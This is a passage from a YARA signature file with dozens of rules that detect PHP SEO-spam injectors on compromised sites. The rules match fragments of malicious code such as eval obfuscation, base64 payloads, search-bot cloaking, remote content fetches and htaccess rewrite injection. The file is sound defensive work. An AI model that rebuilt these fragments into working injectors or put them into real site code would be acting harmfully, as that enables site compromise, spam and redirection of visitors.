        $trigger = "define('CONFIG_FILE', '/images/config.db');"
    condition:
        $trigger
}

private rule PR06360 : trigger
{
    strings:
        $ps0 = "$wp_add_filter = $erz('$v', 'e'.'va'.'l"
    condition:
        $ps0
}

rule php_spamseo_injector_075 : spamseo
{
    strings:
        $trigger = ")));');"
    condition:
        $trigger and PR06360
}

rule php_spamseo_injector_076 : spamseo
{
    strings:
        $trigger = "$websource= GetWebCode($site.$_REQUEST"
    condition:
        $trigger and PR00092
}

rule php_spamseo_injector_077 : spamseo
{
    strings:
        $trigger = "<title><?php echo $arr_tit[$id]; ?>,<?php echo $arr_tita[$id];"
    condition:
        $trigger
}

rule php_spamseo_injector_079 : spamseo
{
    strings:
        $trigger = "} else if ($cloackedPage) {"
    condition:
        $trigger and PR00080
}

rule php_spamseo_injector_080 : spamseo
{
    strings:
        $trigger = "<?php include('_links.php'); ?><!DOCTYPE html>"
    condition:
        $trigger
}

rule php_spamseo_injector_081 : spamseo
{
    strings:
        $trigger = "\"User-Agent: Mozilla/5.0 aol yahoo(compatible; Googlebot/2.1; +http://www.google.com/bot.html)\","
    condition:
        $trigger
}

private rule PR06361 : trigger
{
    strings:
        $ps0 = "echo $file.'<font color=\\\"red\\\"> insufficient permission!</font><br>';"
    condition:
        $ps0
}

rule php_spamseo_injector_081_02 : spamseo
{
    strings:
        $trigger = "function geturl($url)"
    condition:
        $trigger and PR06361 and PR02208
}

rule php_spamseo_injector_082 : spamseo
{
    strings:
        $trigger = "if (($result = file_get_contents('http://' . $sum . '-"
    condition:
        $trigger
}

rule php_spamseo_injector_083 : spamseo
{
    strings:
        $trigger = "add_action('wp_loaded','thfr_kete_register_codes', 13);"
    condition:
        $trigger
}

rule php_spamseo_injector_086 : spamseo
{
    strings:
        $trigger = "setcookie(\"__utpg\", $active, time() + $temps, \"/\", \""
    condition:
        $trigger and PR00092
}

rule php_spamseo_injector_087 : spamseo
{
    strings:
        $trigger = "create_function('$'.'v',$"
    condition:
        $trigger
}

private rule PR06362 : trigger
{
    strings:
        $ps0 = "\";echo$str = file_get_contents($file)"
    condition:
        $ps0
}

rule php_spamseo_injector_089 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06362
}

rule php_spamseo_injector_090 : spamseo
{
    strings:
        $trigger = "array_unshift($templates, ___REALDOCROOT"
    condition:
        $trigger and PR00265
}

private rule PR06363 : trigger
{
    strings:
        $ps0 = "base64_decode($lpc)"
    condition:
        $ps0
}

rule php_spamseo_injector_091 : spamseo
{
    strings:
        $trigger = "echo base64"
    condition:
        $trigger and PR06363
}

rule php_spamseo_injector_092 : spamseo
{
    strings:
        $trigger = "@require_once(JPATH_SITE.'/plugins/search/"
    condition:
        $trigger
}

rule php_spamseo_injector_093 : spamseo
{
    strings:
        $trigger = "$redirectContext = file_get_contents(REDIRECT_DOMAIN.'/'.(isset($_GET['key'])?$_GET['key']:''));"
    condition:
        $trigger
}

private rule PR06364 : trigger
{
    strings:
        $ps0 = "function GetHttpPage"
    condition:
        $ps0
}

private rule PR06365 : trigger
{
    strings:
        $ps0 = "$errstr . \"--->\""
    condition:
        $ps0
}

rule php_spamseo_injector_094 : spamseo
{
    strings:
        $trigger = "$jumpdomain = GetHttpPage($jpdomain);"
    condition:
        $trigger and PR06364 and PR01401 and PR06365
}

private rule PR06366 : trigger
{
    strings:
        $ps0 = "header('Location: ' . $jump);exit();"
    condition:
        $ps0
}

rule php_spamseo_injector_094_02 : spamseo
{
    strings:
        $trigger = "$errstr . \"--->\""
    condition:
        $trigger and PR06366 and PR06364 and PR01401
}

rule php_spamseo_injector_095 : spamseo
{
    strings:
        $trigger = "$Scripture = array();foreach(scandir($Christ) as $AMEN){"
    condition:
        $trigger
}

rule php_spamseo_injector_096 : spamseo
{
    strings:
        $trigger = "recursive_remove_directory($_SERVER['DOCUMENT_ROOT'].$proxyfile.\"cache\",true);"
    condition:
        $trigger
}

rule php_spamseo_injector_097 : spamseo
{
    strings:
        $trigger = "} ob_start('_php_cache_speedup_func_optimizer_');"
    condition:
        $trigger
}

private rule PR06367 : trigger
{
    strings:
        $ps0 = "$content=gethttpcnt($website.$otherstring);"
    condition:
        $ps0
}

rule php_spamseo_injector_098 : spamseo
{
    strings:
        $trigger = "$content=str_replace(\"\\\"images/\",\"\\\"\" . $website . \"/images/\",$content);"
    condition:
        $trigger and PR06367
}

rule php_spamseo_injector_099 : spamseo
{
    strings:
        $trigger = "$htmls = preg_replace(\"/<\\/body>/i\",\"<a href=\\\"http:"
    condition:
        $trigger
}

rule php_spamseo_injector_101 : spamseo
{
    strings:
        $trigger = "$numAds = count($postDefWPTheme);"
    condition:
        $trigger and PR04286
}

rule php_spamseo_injector_102 : spamseo
{
    strings:
        $trigger = "echo file_get_contents(system_news_path().$uri); die;"
    condition:
        $trigger
}

private rule PR06368 : trigger
{
    strings:
        $ps0 = "$file_url .= '?n=' . $_SERVER['QUERY_STRING'];"
    condition:
        $ps0
}

private rule PR06369 : trigger
{
    strings:
        $ps0 = "$file = file_get_contents($file_url);"
    condition:
        $ps0
}

rule php_spamseo_injector_104 : spamseo
{
    strings:
        $trigger = "echo $file;"
    condition:
        $trigger and PR06368 and PR06369
}

private rule PR06370 : trigger
{
    strings:
        $ps0 = "if ( !is_user_logged_in() && get_option('ame_ip')!=$ip && $btt==false) {"
    condition:
        $ps0
}

rule php_spamseo_injector_106 : spamseo
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR06370
}

private rule PR06371 : trigger
{
    strings:
        $ps0 = "$web_content = str_replace($content_url,"
    condition:
        $ps0
}

rule php_spamseo_injector_108 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06371
}

rule php_spamseo_injector_109 : spamseo
{
    strings:
        $trigger = "if(strpos($houzhui,'index.php') != false"
    condition:
        $trigger
}

rule php_spamseo_injector_110 : spamseo
{
    strings:
        $trigger = "$pgs[]='<a href=\"'.$page[1].'\">'.$key[1].'</a>';"
    condition:
        $trigger
}

rule php_spamseo_injector_110_02 : spamseo
{
    strings:
        $trigger = "print 'Domain changed!';}else{print 'Key Error!';}exit(0);} ?>"
    condition:
        $trigger
}

rule php_spamseo_injector_112 : spamseo
{
    strings:
        $trigger = "$dir = 'wp-maps'"
    condition:
        $trigger
}

rule php_spamseo_injector_113 : spamseo
{
    strings:
        $trigger = ";$wpconfigstr=str_replace($settingsstring,$newwpsettings,$source);if(!is_writeable($filename)){@unlink($filename);}file_put_contents($filename"
    condition:
        $trigger
}

private rule PR06372 : trigger
{
    strings:
        $ps0 = "$url_string = 'http://'.base64_decode($api_key2).'/'.$par.'/'.$id;"
    condition:
        $ps0
}

rule php_spamseo_injector_114 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR00091 and PR06372
}

private rule PR06373 : trigger
{
    strings:
        $ps0 = "$ksite = !empty($_GET["
    condition:
        $ps0
}

rule php_spamseo_injector_115 : spamseo
{
    strings:
        $trigger = "$content = file_get_contents($fromsite"
    condition:
        $trigger and PR04816 and PR06373
}

rule php_spamseo_injector_116 : spamseo
{
    strings:
        $trigger = "echo preg_replace(\"/<script.*?<\\/script>/si\", '', $homepage_content);"
    condition:
        $trigger
}

private rule PR06374 : trigger
{
    strings:
        $ps0 = "$GLOBALS['user_func'] = @create_function( '', '};'.$value"
    condition:
        $ps0
}

rule php_spamseo_injector_117 : spamseo
{
    strings:
        $trigger = "get_"
    condition:
        $trigger and PR06374
}

rule php_spamseo_injector_118 : spamseo
{
    strings:
        $trigger = "echo base64_decode(\"77u/PHAgc3R5bGU9InBvc2l0aW9uOm"
    condition:
        $trigger
}

rule php_spamseo_injector_119 : spamseo
{
    strings:
        $trigger = "if(strstr($htmls,\"#prodescription#\"))"
    condition:
        $trigger
}

rule php_spamseo_injector_120 : spamseo
{
    strings:
        $trigger = "_cntnt=@wp_remote_fopen($uri);"
    condition:
        $trigger and PR01458
}

rule php_spamseo_injector_121 : spamseo
{
    strings:
        $trigger = "$rate_code=base64_decode('PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHN"
    condition:
        $trigger and PR00397
}

rule php_spamseo_injector_123 : spamseo
{
    strings:
        $trigger = "@file_get_contents('http://'.$hosting_domain.$file.\"?host=$host&ip=$ip&ua=$ua&ref=$ref\");"
    condition:
        $trigger
}

rule php_spamseo_injector_124 : spamseo
{
    strings:
        $trigger = "= '' . base64_decode('PD9waHA=')"
    condition:
        $trigger
}

rule php_spamseo_injector_125 : spamseo
{
    strings:
        $trigger = ";echo$str = @file_get_contents($file);"
    condition:
        $trigger
}

rule php_spamseo_injector_126 : spamseo
{
    strings:
        $trigger = "'@^'.$target_siteurl.'/*@is';"
    condition:
        $trigger and PR00092
}

private rule PR06375 : trigger
{
    strings:
        $ps0 = "echo @file_get_contents(\"http"
    condition:
        $ps0
}

rule php_spamseo_injector_129 : spamseo
{
    strings:
        $trigger = "if(strpos($s_http_user_agent, \"googlebot\") !== false|| strpos($s_http_user_agent, \"yahoo\") !== false||"
    condition:
        $trigger and PR06375
}

private rule PR06376 : trigger
{
    strings:
        $ps0 = "preg_match(\"/(Googlebot|bingbot)(?:"
    condition:
        $ps0
}

rule php_spamseo_injector_131 : spamseo
{
    strings:
        $trigger = "$movedb = user_min_browser($_SERVER['HTTP_USER_AGENT']);"
    condition:
        $trigger and PR06376 and PR01431
}

private rule PR06377 : trigger
{
    strings:
        $ps0 = "$agent_match = preg_match(\"~(Googlebot|Mediapartners|"
    condition:
        $ps0
}

rule php_spamseo_injector_132 : spamseo
{
    strings:
        $trigger = "add_action('wp_footer"
    condition:
        $trigger and PR06377
}

private rule PR06378 : trigger
{
    strings:
        $ps0 = "$htmls =  str_replace(\"</script></body></html>\",\"</script><script src=\\\"http:"
    condition:
        $ps0
}

rule php_spamseo_injector_133 : spamseo
{
    strings:
        $trigger = "echo $htmls;"
    condition:
        $trigger and PR06378
}

private rule PR06379 : trigger
{
    strings:
        $ps0 = "$body=file_get_contents(\"http://\".$domain);"
    condition:
        $ps0
}

rule php_spamseo_injector_134 : spamseo
{
    strings:
        $trigger = "\") OR strstr($ip,"
    condition:
        $trigger and PR06379
}

private rule PR06380 : trigger
{
    strings:
        $ps0 = "preg_replace(\"/.+/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66"
    condition:
        $ps0
}

rule php_spamseo_injector_135 : spamseo
{
    strings:
        $trigger = "\\x29\\x29\\x29\\x3B\",\".\");"
    condition:
        $trigger and PR06380
}

private rule PR06381 : trigger
{
    strings:
        $ps0 = "echo $html;"
    condition:
        $ps0
}

rule php_spamseo_injector_136 : spamseo
{
    strings:
        $trigger = "echo \"<br />httpCode:\".$httpCode;"
    condition:
        $trigger and PR06381 and PR03133
}

rule php_spamseo_injector_137 : spamseo
{
    strings:
        $trigger = "return base64_decode(get_key(\"evalcode\"));"
    condition:
        $trigger
}

rule php_spamseo_injector_138 : spamseo
{
    strings:
        $trigger = "$tmp=getlinks($googlelinks,$links);"
    condition:
        $trigger and PR01818
}

private rule PR06382 : trigger
{
    strings:
        $ps0 = "$donor = $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];"
    condition:
        $ps0
}

rule php_spamseo_injector_139 : spamseo
{
    strings:
        $trigger = "$links = file_get_contents(\"$server\");"
    condition:
        $trigger and PR06382
}

private rule PR06383 : trigger
{
    strings:
        $ps0 = "$contents = curlget($url1.\"/url.php?list=\".$uu);"
    condition:
        $ps0
}

rule php_spamseo_injector_140 : spamseo
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR06383
}

rule php_spamseo_injector_141 : spamseo
{
    strings:
        $trigger = "($_SERVER['SERVER_NAME']).\"\\046\\x69\\075\".$x"
    condition:
        $trigger and PR00719
}

// MANUAL FIX NECESSARY
private rule PR06384 : trigger
{
    strings:
        $ps0 = "$this->item->hits"
    condition:
        $ps0
}

rule php_spamseo_injector_143 : spamseo
{
    strings:
        $trigger = "PGRpd"
        $php_spamseo_injector_143_r0 = /PGRpd[^;]*['\"][\s]*.[\s]*[^'\"]/
    condition:
        $trigger and PR06384 and PR01877 and PR01479 and $php_spamseo_injector_143_r0
}

private rule PR06385 : trigger
{
    strings:
        $ps0 = "if ($cont!="
    condition:
        $ps0
}

rule php_spamseo_injector_143_02 : spamseo
{
    strings:
        $trigger = "PGRpd"
    condition:
        $trigger and PR01479 and PR06384 and PR06385 and PR01877
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_143_03 : spamseo
{
    strings:
        $trigger = "PGRpd"
        $php_spamseo_injector_143_03_r0 = /['\"]PGRpd[^;]+;[\s]*echo[\s]*base64_decode/
    condition:
        $trigger and PR01877 and PR01479 and $php_spamseo_injector_143_03_r0
}

rule php_spamseo_injector_143_04 : spamseo
{
    strings:
        $trigger = "PGRpd"
    condition:
        $trigger and PR06384 and PR03450
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_143_05 : spamseo
{
    strings:
        $trigger = "PGRpd"
        $php_spamseo_injector_143_05_r0 = /if\s*[^\(]*\(\s*[^\$]*\$this->item->\w+\s*[^\{]*\{\s*\$\w+[^']{1,15}'PGR/
    condition:
        $trigger and PR06384 and PR01877 and PR01479 and $php_spamseo_injector_143_05_r0
}

private rule PR06386 : trigger
{
    strings:
        $ps0 = "return; // Silence gold !"
    condition:
        $ps0
}

rule php_spamseo_injector_144 : spamseo
{
    strings:
        $trigger = "botvsbrowser.com/rch_pdf/show.php"
    condition:
        $trigger and PR01401 and PR06386
}

rule php_spamseo_injector_144_02 : spamseo
{
    strings:
        $trigger = "@require_once('class.wp-includes.php');"
    condition:
        $trigger
}

rule php_spamseo_injector_145 : spamseo
{
    strings:
        $trigger = "elseif (($new_html = __smart_inject($new_html, $materials)) === false) {"
    condition:
        $trigger and PR02803
}

rule php_spamseo_injector_146 : spamseo
{
    strings:
        $trigger = "return substr_replace($content, \"\\n\" . $script . \"\\n\" . $tag, $tag_pos, strlen($tag));"
    condition:
        $trigger and PR03133
}

private rule PR06387 : trigger
{
    strings:
        $ps0 = "echo $x"
    condition:
        $ps0
}

rule php_spamseo_injector_149 : spamseo
{
    strings:
        $trigger = "error_reporting(0);$x"
    condition:
        $trigger and PR06387 and PR00719
}

private rule PR06388 : trigger
{
    strings:
        $ps0 = "if(strpos($l,'beginlink:')!==false)"
    condition:
        $ps0
}

rule php_spamseo_injector_150 : spamseo
{
    strings:
        $trigger = "if(preg_match(\"/googlebot/i\","
    condition:
        $trigger and PR06388 and PR00080
}

rule php_spamseo_injector_152 : spamseo
{
    strings:
        $trigger = "$string_of_redirect_for_write_in_htaccess=\"RewriteRule ^\".$rand_dir.\"(.*)\\.\".$_POST['redirect_expansion"
    condition:
        $trigger and PR00092
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_153 : spamseo
{
    strings:
        $trigger = "-NO-WAY-"
        $php_spamseo_injector_153_r0 = /\$user_agent_to_filter,[\s]*['\"].NO.WAY.['\"],[\s]*@?\$_SERVER\[['\"]HTTP_USER_AGENT['\"]\]/
        $php_spamseo_injector_153_r1 = /<\?php[\s]*(\$is_bot[^;]+;[\s]*)?\$user_agent_to_filter/
    condition:
        $trigger and PR01282 and $php_spamseo_injector_153_r0 and $php_spamseo_injector_153_r1
}

// MANUAL FIX NECESSARY
private rule PR06389 : trigger
{
    strings:
        $ps0 = "$adm_url"
    condition:
        $ps0
}

rule php_spamseo_injector_153_02 : spamseo
{
    strings:
        $trigger = "-NO-WAY-"
        $php_spamseo_injector_153_02_r0 = /\$user_agent_to_filter,[\s]*['\"].NO.WAY.['\"],[\s]*@?\$_SERVER\[['\"]HTTP_USER_AGENT['\"]\]/
    condition:
        $trigger and PR01282 and PR06389 and $php_spamseo_injector_153_02_r0
}

// MANUAL FIX NECESSARY
private rule PR06390 : trigger
{
    strings:
        $ps0 = "@file_get_contents(PATH777 . 'base')));"
    condition:
        $ps0
}

rule php_spamseo_injector_153_04 : spamseo
{
    strings:
        $trigger = "-NO-WAY-"
        $php_spamseo_injector_153_04_r0 = /\$user_agent_to_filter,[\s]*['\"].NO.WAY.['\"],[\s]*@?\$_SERVER\[['\"]HTTP_USER_AGENT['\"]\]/
    condition:
        $trigger and PR01282 and PR06390 and $php_spamseo_injector_153_04_r0
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_153_07 : spamseo
{
    strings:
        $trigger = "-NO-WAY-"
        $php_spamseo_injector_153_07_r0 = /\$user_agent_to_filter,[\s]*['\"].NO.WAY.['\"],[\s]*@?\$_SERVER\[['\"]HTTP_USER_AGENT['\"]\]/
        $php_spamseo_injector_153_07_r1 = /NO.WAY.[^{]+\{[\s]*\}[\s]*\{/
    condition:
        $trigger and PR01282 and $php_spamseo_injector_153_07_r0 and $php_spamseo_injector_153_07_r1
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_153_08 : spamseo
{
    strings:
        $trigger = "-NO-WAY-',@$_SERVER['HTTP_USER_AGENT']);if(strpos($str,'-NO-WAY-"
        $php_spamseo_injector_153_08_r0 = /\$user_agent_to_filter,[\s]*['\"].NO.WAY.['\"],[\s]*@?\$_SERVER\[['\"]HTTP_USER_AGENT['\"]\]/
    condition:
        $trigger and PR01282 and $php_spamseo_injector_153_08_r0
}

private rule PR06391 : trigger
{
    strings:
        $ps0 = "$link = mysql_connect(urldecode($_POST["
    condition:
        $ps0
}

rule php_spamseo_injector_154 : spamseo
{
    strings:
        $trigger = "echo \"<true>\".$row[0].\"<true>\";"
    condition:
        $trigger and PR00092 and PR06391
}

private rule PR06392 : trigger
{
    strings:
        $ps0 = "$res_el['linkerror'] == '3') $double_links[$i] = $all_links_o[($i-1)];"
    condition:
        $ps0
}

rule php_spamseo_injector_155 : spamseo
{
    strings:
        $trigger = "if(str"
    condition:
        $trigger and PR06392
}

private rule PR06393 : trigger
{
    strings:
        $ps0 = "function gethttpcnt($url,$timeout ="
    condition:
        $ps0
}

rule php_spamseo_injector_156 : spamseo
{
    strings:
        $trigger = "echo \"$content\";"
    condition:
        $trigger and PR01282 and PR06393
}

private rule PR06394 : trigger
{
    strings:
        $ps0 = "echo kalem('http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']).'/request.php?token"
    condition:
        $ps0
}

rule php_spamseo_injector_157 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06394
}

private rule PR06395 : trigger
{
    strings:
        $ps0 = "if ($body && isset($body['data'])) $data = urldecode($body['data']);"
    condition:
        $ps0
}

private rule PR06396 : trigger
{
    strings:
        $ps0 = "$bot = true;"
    condition:
        $ps0
}

rule php_spamseo_injector_158 : spamseo
{
    strings:
        $trigger = "\"&ip=$user_ip&version=$version\";"
    condition:
        $trigger and PR00080 and PR06395 and PR06396
}

private rule PR06397 : trigger
{
    strings:
        $ps0 = ".com"
    condition:
        $ps0
}

rule php_spamseo_injector_158_02 : spamseo
{
    strings:
        $trigger = "$contents = @get_data_l().$contents;"
    condition:
        $trigger and PR06397
}

rule php_spamseo_injector_159 : spamseo
{
    strings:
        $trigger = "= stristr($finish_result[$a]['content'], '<title>Directory Listing Denied</title>');"
    condition:
        $trigger and PR01458
}

rule php_spamseo_injector_159_02 : spamseo
{
    strings:
        $trigger = "($not_loading_clean != null) and ($not_loading_clean != 'rvf'))"
    condition:
        $trigger and PR01458
}

private rule PR06398 : trigger
{
    strings:
        $ps0 = "fwrite($fnew, $arr_all_domains[$c][$o]);"
    condition:
        $ps0
}

rule php_spamseo_injector_159_03 : spamseo
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR06398
}

private rule PR06399 : trigger
{
    strings:
        $ps0 = "function start_work($off, $unto)"
    condition:
        $ps0
}

private rule PR06400 : trigger
{
    strings:
        $ps0 = "$url = \"http://$domen/\".\"$path\".\"/1/$i.php\";"
    condition:
        $ps0
}

rule php_spamseo_injector_159_04 : spamseo
{
    strings:
        $trigger = "$_GE"
    condition:
        $trigger and PR06399 and PR06400
}

rule php_spamseo_injector_160 : spamseo
{
    strings:
        $trigger = "$js = '<script>var _$=[\"location\",\"href\",\"'.$redirect.'\"];window[_$[0]][_$[1]]=_$[2];</script>';"
    condition:
        $trigger and PR00719
}

rule php_spamseo_injector_161 : spamseo
{
    strings:
        $trigger = "echo '<div class=\"_all_wplink"
    condition:
        $trigger and PR04411
}

private rule PR06401 : trigger
{
    strings:
        $ps0 = "<div class=\"_all_wplink"
    condition:
        $ps0
}

rule php_spamseo_injector_161_02 : spamseo
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR06401
}

private rule PR06402 : trigger
{
    strings:
        $ps0 = "x73\\x63\\x72\\x69\\x70\\x74\\x3E\"];document.writeln(_$[0]); </script>"
    condition:
        $ps0
}

rule php_spamseo_injector_162 : spamseo
{
    strings:
        $trigger = "$contents = file_get_contents($url);"
    condition:
        $trigger and PR06402 and PR04962
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_163 : spamseo
{
    strings:
        $trigger = "charset=gb"
        $php_spamseo_injector_163_r0 = /\][\s]*.[\s]*\$_SERVER\['PHP_SELF'\];[\s]*(\$[\w_]+[\s]*=|function)/
    condition:
        $trigger and PR06211 and PR00070 and $php_spamseo_injector_163_r0
}

private rule PR06403 : trigger
{
    strings:
        $ps0 = ".base64_decode(\"L2luZGV4LnBocD9ob3N0PQ==\").$host_name"
    condition:
        $ps0
}

private rule PR06404 : trigger
{
    strings:
        $ps0 = "strpos($key"
    condition:
        $ps0
}

rule php_spamseo_injector_163_02 : spamseo
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06403 and PR06404
}

private rule PR06405 : trigger
{
    strings:
        $ps0 = ".base64_decode(\"L2"
    condition:
        $ps0
}

rule php_spamseo_injector_163_03 : spamseo
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR06405 and PR06212 and PR06404
}

private rule PR06406 : trigger
{
    strings:
        $ps0 = "$write = write_bad($current_url, $parser_url ."
    condition:
        $ps0
}

rule php_spamseo_injector_164 : spamseo
{
    strings:
        $trigger = "header(\"Location: http://google.com\"); exit();"
    condition:
        $trigger and PR00371 and PR06406
}

private rule PR06407 : trigger
{
    strings:
        $ps0 = "ini_set('user_agent','Mozilla/5.0 "
    condition:
        $ps0
}

rule php_spamseo_injector_165 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06407 and PR00070
}

private rule PR06408 : trigger
{
    strings:
        $ps0 = "$url = \"$host/\".$_SERVER[\"QUERY_STRING\"];"
    condition:
        $ps0
}

private rule PR06409 : trigger
{
    strings:
        $ps0 = "function getContent($url,&$result,$proxystr=null){"
    condition:
        $ps0
}

rule php_spamseo_injector_166 : spamseo
{
    strings:
        $trigger = "$htmls =  str_replace(\"<a href=\\\"\",\"<a href=\\\"$target?\",$htmls);"
    condition:
        $trigger and PR06408 and PR06409
}

private rule PR06410 : trigger
{
    strings:
        $ps0 = ".\"?http://\".$_SERVER['HTTP_HOST'].$_SERVER[\"REQUEST_URI\"]);"
    condition:
        $ps0
}

private rule PR06411 : trigger
{
    strings:
        $ps0 = "ini_set(\"user_agent\",$_SERVER[HTTP_USER_AGENT]);"
    condition:
        $ps0
}

rule php_spamseo_injector_168 : spamseo
{
    strings:
        $trigger = "$str = file_get_contents($"
    condition:
        $trigger and PR06410 and PR06411
}

private rule PR06412 : trigger
{
    strings:
        $ps0 = ";echo outdo($"
    condition:
        $ps0
}

private rule PR06413 : trigger
{
    strings:
        $ps0 = "=@$_GET["
    condition:
        $ps0
}

rule php_spamseo_injector_169 : spamseo
{
    strings:
        $trigger = "src=\"'.base64_decode($"
    condition:
        $trigger and PR06412 and PR06413 and PR01700
}

private rule PR06414 : trigger
{
    strings:
        $ps0 = "$f"
    condition:
        $ps0
}

private rule PR06415 : trigger
{
    strings:
        $ps0 = "$currUrl = $ancienCont.$currUrl;"
    condition:
        $ps0
}

rule php_spamseo_injector_170 : spamseo
{
    strings:
        $trigger = "function curPageURL()"
    condition:
        $trigger and PR06414 and PR06415
}

private rule PR06416 : trigger
{
    strings:
        $ps0 = "foreach ($search_engines as $some_bots) {"
    condition:
        $ps0
}

rule php_spamseo_injector_171 : spamseo
{
    strings:
        $trigger = "\"\\${1} \\n\". $links, $data, 1 );"
    condition:
        $trigger and PR00080 and PR06416
}

private rule PR06417 : trigger
{
    strings:
        $ps0 = "array(); preg_match(\"/RewriteRule"
    condition:
        $ps0
}

rule php_spamseo_injector_172 : spamseo
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR06417 and PR00070
}

private rule PR06418 : trigger
{
    strings:
        $ps0 = "if(!is_null($_GET['p_id']))"
    condition:
        $ps0
}

private rule PR06419 : trigger
{
    strings:
        $ps0 = "if(!is_null($_GET['pageIndex']))"
    condition:
        $ps0
}

rule php_spamseo_injector_173 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06418 and PR01544 and PR06419 and PR02875
}

private rule PR06420 : trigger
{
    strings:
        $ps0 = "if(!empty($_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_spamseo_injector_174 : spamseo
{
    strings:
        $trigger = "$userAgents = array(\"Google\", \"Slurp\""
    condition:
        $trigger and PR03061 and PR06420
}

rule php_spamseo_injector_175 : spamseo
{
    strings:
        $trigger = "gimmeyourfuckingtemplate"
    condition:
        $trigger and PR00042
}

private rule PR06421 : trigger
{
    strings:
        $ps0 = "urlencode(base64_encode(serialize($input)));"
    condition:
        $ps0
}

private rule PR06422 : trigger
{
    strings:
        $ps0 = "echo $data . $content;"
    condition:
        $ps0
}

private rule PR06423 : trigger
{
    strings:
        $ps0 = "$data = @gzuncompress(substr($response, - $parts[1]));"
    condition:
        $ps0
}

rule php_spamseo_injector_176 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06421 and PR06422 and PR06423
}

private rule PR06424 : trigger
{
    strings:
        $ps0 = "if(!empty($_GET[\"inf0\"])){$"
    condition:
        $ps0
}

rule php_spamseo_injector_177 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06424
}

private rule PR06425 : trigger
{
    strings:
        $ps0 = "= get_data(\"$"
    condition:
        $ps0
}

private rule PR06426 : trigger
{
    strings:
        $ps0 = "('display_errors', '0');$"
    condition:
        $ps0
}

private rule PR06427 : trigger
{
    strings:
        $ps0 = "('#<a href(.*)</a>#', \"$"
    condition:
        $ps0
}

rule php_spamseo_injector_178 : spamseo
{
    strings:
        $trigger = "(array('http' => array('timeout' => 10,'method' => 'POST')));$"
    condition:
        $trigger and PR06425 and PR06426 and PR00719 and PR06427
}

rule php_spamseo_injector_180 : spamseo
{
    strings:
        $trigger = "unserialize(get_option('default_pages"
    condition:
        $trigger and PR01533
}

private rule PR06428 : trigger
{
    strings:
        $ps0 = "echo \"GOOD<br>\".$cache_dir;"
    condition:
        $ps0
}

rule php_spamseo_injector_181 : spamseo
{
    strings:
        $trigger = "$body = file_get_contents($cache_dir.\"/\".$post_url_cache.\"_body.js\");"
    condition:
        $trigger and PR00092 and PR06428
}

private rule PR06429 : trigger
{
    strings:
        $ps0 = "&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']).'&ref='.urlencode($sReferer))"
    condition:
        $ps0
}

private rule PR06430 : trigger
{
    strings:
        $ps0 = "if(!(strpos($sUserAgent, 'google') === false))"
    condition:
        $ps0
}

rule php_spamseo_injector_182 : spamseo
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR06429 and PR06430
}

private rule PR06431 : trigger
{
    strings:
        $ps0 = "echo $sOutContent;"
    condition:
        $ps0
}

private rule PR06432 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST['GetContent']) === true)"
    condition:
        $ps0
}

rule php_spamseo_injector_183 : spamseo
{
    strings:
        $trigger = "function RecursiveDelete($sDirectory, $bIsEmpty = false)"
    condition:
        $trigger and PR00092 and PR06431 and PR06432
}

rule php_spamseo_injector_185 : spamseo
{
    strings:
        $trigger = "include './tiao.php'"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR06433 : trigger
{
    strings:
        $ps0 = "$enc1 = $enc2 = $enc3 = $enc4 = \"\";"
    condition:
        $ps0
}

private rule PR06434 : trigger
{
    strings:
        $ps0 = "touch($htaccess_path, time() - mt_rand("
    condition:
        $ps0
}

rule php_spamseo_injector_186 : spamseo
{
    strings:
        $trigger = "Rewrite"
        $php_spamseo_injector_186_r0 = /RewriteCond\s*\%{HTTP_USER_AGENT}\s*\((bing\||yahoo\||google\|)+[^\)]+\)\s*\[/
    condition:
        $trigger and PR06433 and PR00162 and PR06434 and $php_spamseo_injector_186_r0
}

rule php_spamseo_injector_187 : spamseo
{
    strings:
        $trigger = "if (preg_match(\"/[^\\/]+\\.html$/\", $url) and file_exists"
    condition:
        $trigger and PR00070
}

private rule PR06435 : trigger
{
    strings:
        $ps0 = "if (( preg_match ('/Trident/i', $useragent) && !preg_match"
    condition:
        $ps0
}

private rule PR06436 : trigger
{
    strings:
        $ps0 = "http://\".\"logs\".\"http\".\".com/\".\"logs/?ip="
    condition:
        $ps0
}

rule php_spamseo_injector_188 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06435 and PR06436
}

private rule PR06437 : trigger
{
    strings:
        $ps0 = ".=substr($"
    condition:
        $ps0
}

private rule PR06438 : trigger
{
    strings:
        $ps0 = "UmFkYXJ8"
    condition:
        $ps0
}

rule php_spamseo_injector_189 : spamseo
{
    strings:
        $trigger = "=\"\";foreach($"
    condition:
        $trigger and PR00029 and PR06437 and PR06438
}

